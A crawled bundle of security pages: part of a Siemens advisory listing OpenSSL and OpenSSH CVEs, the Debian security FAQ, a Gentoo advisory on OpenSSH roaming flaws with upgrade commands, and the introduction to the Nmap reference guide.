all Unix and Windows targets, including Visual C builds. However, some build instructions for the
diverse Windows targets on 1.0.2 encourage you to specify your own –preﬁx. OpenSSL versions
1.1.1, 1.1.0 and 1.0.2 are affected by this issue. Due to the limited scope of affected deployments this
has been assessed as low severity and therefore we are not creating new releases at this time. Fixed
in OpenSSL 1.1.1d (Affected 1.1.1-1.1.1c). Fixed in OpenSSL 1.1.0l (Affected 1.1.0-1.1.0k). Fixed in
OpenSSL 1.0.2t (Affected 1.0.2-1.0.2s).

CVSS v3.1 Base Score
CVSS Vector
CWE

3.3
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-295: Improper Certiﬁcate Validation

Vulnerability CVE-2019-6109

An issue was discovered in OpenSSH 7.9. Due to missing character encoding in the progress display,
a malicious server (or Man-in-The-Middle attacker) can employ crafted object names to manipulate
the client output, e.g., by using ANSI control codes to hide additional ﬁles being transferred. This
affects refresh_progress_meter() in progressmeter.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

6.8
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:P/RL:O/RC:C
CWE-116: Improper Encoding or Escaping of Output

Vulnerability CVE-2019-6110

In OpenSSH 7.9, due to accepting and displaying arbitrary stderr output from the server, a malicious
server (or Man-in-The-Middle attacker) can manipulate the client output, for example to use ANSI
control codes to hide additional ﬁles being transferred.

CVSS v3.1 Base Score
CVSS Vector
CWE

6.8
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:P/RL:O/RC:C
CWE-838: Inappropriate Encoding for Output Context

Vulnerability CVE-2019-6111

An issue was discovered in OpenSSH 7.9. Due to the scp implementation being derived from 1983 rcp,
the server chooses which ﬁles/directories are sent to the client. However, the scp client only performs
cursory validation of the object name returned (only directory traversal attacks are prevented). A
malicious scp server (or Man-in-The-Middle attacker) can overwrite arbitrary ﬁles in the scp client
target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as
well (for example, to overwrite the .ssh/authorized_keys ﬁle).

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N/E:P/RL:O/RC:C
CWE-22: Improper Limitation of a Pathname to a Restricted Directory
(’Path Traversal’)

SSA-412672

© Siemens 2022

Page 18 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2019-16905

OpenSSH 7.7 through 7.9 and 8.x before 8.1, when compiled with an experimental key type, has a
pre-authentication integer overﬂow if a client or server is conﬁgured to use a crafted XMSS key. This
leads to memory corruption and local code execution because of an error in the XMSS key parsing
algorithm. NOTE: the XMSS implementation is considered experimental in all released OpenSSH
versions, and there is no supported way to enable it when building portable OpenSSH.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.8
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-190: Integer Overﬂow or Wraparound

ADDITIONAL INFORMATION

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the
Siemens ProductCERT:

https://www.siemens.com/cert/advisories

HISTORY DATA

V1.0 (2022-12-13):

Publication Date

TERMS OF USE

Siemens Security Advisories are subject to the terms and conditions contained in Siemens’ underlying
license terms or other applicable agreements previously agreed to with Siemens (hereinafter "License
Terms"). To the extent applicable to information, software or documentation made available in or through
a Siemens Security Advisory, the Terms of Use of Siemens’ Global Website (https://www.siemens.com/
terms_of_use, hereinafter "Terms of Use"), in particular Sections 8-10 of the Terms of Use, shall apply
additionally. In case of conﬂicts, the License Terms shall prevail over the Terms of Use.

SSA-412672

© Siemens 2022

Page 19 of 19



=== Content from www.debian.org_2c992b25_20250126_125218.html ===

[![Debian](../Pics/openlogo-50.png)](../ "Debian Home")

[Skip Quicknav](#content)

* [Blog](https://bits.debian.org/ "Bits from Debian")
* [Micronews](https://micronews.debian.org "Micronews from Debian")
* [Planet](https://planet.debian.org/ "The Planet of Debian")

[Security Information](./)
/
Debian security FAQ

# Debian security FAQ

1. [I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?](#buthow)- [The signature on your advisories does not verify correctly!](#signature)- [How is security handled in Debian?](#handling)- [Why are you fiddling with an old version of that package?](#oldversion)- [The version number for a package indicates that I am still running a vulnerable version!](#version)- [I received an advisory, but the build for one processor architecture seems to be missing.](#archismissing)- [How is security handled for unstable?](#unstable)- [How is security handled for testing?](#testing)- [How is security handled for contrib, non-free and non-free-firmware?](#contrib)- [The advisory says unstable is fixed in version 1.2.3-1, but unstable has 1.2.5-1, what's up?](#sidversionisold)- [Why are there no official mirrors for security.debian.org?](#mirror)- [I've seen DSA 100 and DSA 102, now where is DSA 101?](#missing)- [How can I reach the security team?](#contact)- [I guess I found a security problem, what should I do?](#discover)- [What am I supposed to do with a security problem in one of my packages?](#care)- [I tried to download a package listed in one of the security advisories, but I got a `file not found' error.](#enofile)- [I've got a bugfix, can I upload to security.debian.org directly?](#upload)- [I've got a bugfix, can I upload to proposed-updates instead?](#ppu)- [I'm pretty sure my packages are fine, how can I upload them?](#SecurityUploadQueue)- [How can I help with security?](#help)- [What is the scope of proposed-updates?](#proposed-updates)- [How is the security team composed?](#composing)- [How long will security updates be provided?](#lifespan)- [How can I check the integrity of packages?](#check)- [What to do if a random package breaks after a security update?](#break)- [What is a CVE identifier?](#cvewhat)- [Does Debian issue a DSA for every CVE id?](#cvedsa)- [Can Debian assign CVE identifiers?](#cveget)- [Does Debian have a vulnerability disclosure policy?](#disclosure-policy)- [Our vulnerability management tool has shown that the following issues are open (list of CVEs with random CVSS scores). When are those going to be fixed?](#cve-severity-assessment)- [What does local (remote) mean?](#localremote)

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

---

Back to the [Debian Project homepage](../).

---

This page is also available in the following languages:
Select your language
dansk
Deutsch
español
français
Italiano
Nederlands
polski
Português
suomi
svenska
Русский (Russkij)
中文(简)
中文(HK)
中文(繁)
日本語 (Nihongo)

How to set [the default document language](../intro/cn)

---

**[Home](/)**

* [About](../intro/about)
  + [Social Contract](../social_contract)
  + [Code of Conduct](../code_of_conduct)
  + [Free Software](../intro/free)
  + [Legal Info](../legal)
* [Help Debian](../intro/help)

* [Getting Debian](../distrib/)
  + [Network install](../distrib/netinst)
  + [CD/USB ISO images](../CD/)
  + [Pure Blends](../blends/)
  + [Debian Packages](../distrib/packages)
  + [Developers' Corner](../devel/)

* [News](../News/)
  + [Project News](../News/weekly/)
  + [Events](../events/)
* [Documentation](../doc/)
  + [Release Info](../releases/)
  + [Debian Wiki](https://wiki.debian.org/)

* [Support](../support)
  + [Debian International](../international/)
  + [Security Information](../security/)
  + [Bug reports](../Bugs/)
  + [Mailing Lists](../MailingLists/)

* [Site map](../sitemap)
* [Search](https://search.debian.org/)
* [The Debian Blog](https://bits.debian.org)
* [Debian Micronews](https://micronews.debian.org)
* [Debian Planet](https://planet.debian.org)

See our [contact page](../contact) to get in touch. Web site source code is [available](https://salsa.debian.org/webmaster-team/webwml).

Last Modified: Fri, Oct 6 21:55:11 UTC 2023

Last Built: Sat, Jan 11 19:35:55 UTC 2025

Copyright © 1997-2023 [SPI](https://www.spi-inc.org/) and others; See [license terms](../license)

Debian is a registered [trademark](../trademark) of Software in the Public Interest, Inc.



=== Content from security.gentoo.org_9d1434ac_20250125_234749.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# OpenSSH: Multiple vulnerabilities — GLSA **201601-01**

Multiple vulnerabilities have been found in OpenSSH, allowing
attackers to leak client memory to a server, including private keys.

### Affected packages

| Package | **net-misc/openssh** on all architectures |
| --- | --- |
| Affected versions | < **7.1\_p2** |
| Unaffected versions | >= **7.1\_p2** |

### Background

OpenSSH is a complete SSH protocol implementation that includes SFTP
client and server support.

### Description

Qualys have reported two issues in the “roaming” code included in
the OpenSSH client, which provides undocumented, experimental support for
resuming SSH connections. An OpenSSH client could be tricked into leaking
parts of its memory to a malicious server. Furthermore, a buffer overflow
can be exploited by a malicious server, but its exploitation requires
non-default options and is mitigated due to another bug.

### Impact

A remote attacker could entice a user to connect to a specially crafted
OpenSSH server, possibly resulting in the disclosure of the user’s
private keys. Users with private keys that are not protected by a
passphrase are advised to generate new keys if they have connected to an
SSH server they don’t fully trust.

Note that no special configuration is required to be vulnerable as the
roaming feature is enabled by default on the client.

### Workaround

The issues can be worked around by disabling the roaming code. To do so,
add “UseRoaming no” to the SSH client configuration, or specify “-o
‘UseRoaming no’” on the command line.

### Resolution

All OpenSSH users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-misc/openssh-7.1_p2"

```
### References

* [CVE-2016-0777](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-0777)
* [CVE-2016-0778](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-0778)

**Release date**

January 16, 2016

**Latest revision**

January 16, 2016: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [571892](https://bugs.gentoo.org/show_bug.cgi?id=571892)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from nmap.org_b89a31d3_20250126_125219.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

* [Nmap Network Scanning](toc.html)
* Chapter 15. Nmap Reference Guide

[Prev](data-files-replacing-data-files.html)[Next](man-briefoptions.html)
# Chapter 15. Nmap Reference Guide

Table of Contents

* [Description](man.html#man-description)
* [Options Summary](man-briefoptions.html)
* [Target Specification](man-target-specification.html)
* [Host Discovery](man-host-discovery.html)
* [Port Scanning Basics](man-port-scanning-basics.html)
* [Port Scanning Techniques](man-port-scanning-techniques.html)
* [Port Specification and Scan Order](man-port-specification.html)
* [Service and Version Detection](man-version-detection.html)
* [OS Detection](man-os-detection.html)
* [Nmap Scripting Engine (NSE)](man-nse.html)
* [Timing and Performance](man-performance.html)
* [Firewall/IDS Evasion and Spoofing](man-bypass-firewalls-ids.html)
* [Output](man-output.html)
* [Miscellaneous Options](man-misc-options.html)
* [Runtime Interaction](man-runtime-interaction.html)
* [Examples](man-examples.html)
* [Nmap Book](man-book.html)
* [Bugs](man-bugs.html)
* [Authors](man-author.html)
* [Legal Notices](man-legal.html)
  + [Nmap Copyright and Licensing](man-legal.html#nmap-copyright)
  + [Creative Commons License for this Nmap Guide](man-legal.html#man-copyright)
  + [Source Code Availability and Community Contributions](man-legal.html#source-contrib)
  + [No Warranty](man-legal.html#no-warranty)
  + [Inappropriate Usage](man-legal.html#inappropriate-usage)
  + [Third-Party Software and Funding Notices](man-legal.html#third-party-soft)
  + [United States Export Control](man-legal.html#us-export)
## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.029s latency).
rDNS record for 74.207.244.221: li86-221.members.linode.com
Not shown: 995 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)
|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)
80/tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Go ahead and ScanMe!
646/tcp  filtered ldp
1720/tcp filtered H.323/Q.931
9929/tcp open     nping-echo  Nping echo
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.39
OS details: Linux 2.6.39
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
[Cut first 10 hops for brevity]
11  17.65 ms li86-221.members.linode.com (74.207.244.221)

Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds

```

The newest version of Nmap can be obtained from
[`https://nmap.org`](https://nmap.org). The newest version of this man page
is available at [`https://nmap.org/book/man.html`](https://nmap.org/book/man.html).
It is also included as a chapter of [*Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning*](https://nmap.org/book/).

---

[Prev](data-files-replacing-data-files.html)Using Customized Data Files[Up](toc.html)Nmap Network Scanning[Home](toc.html)[Next](man-briefoptions.html)Options Summary

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from lists.opensuse.org_2d080de9_20250125_234721.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
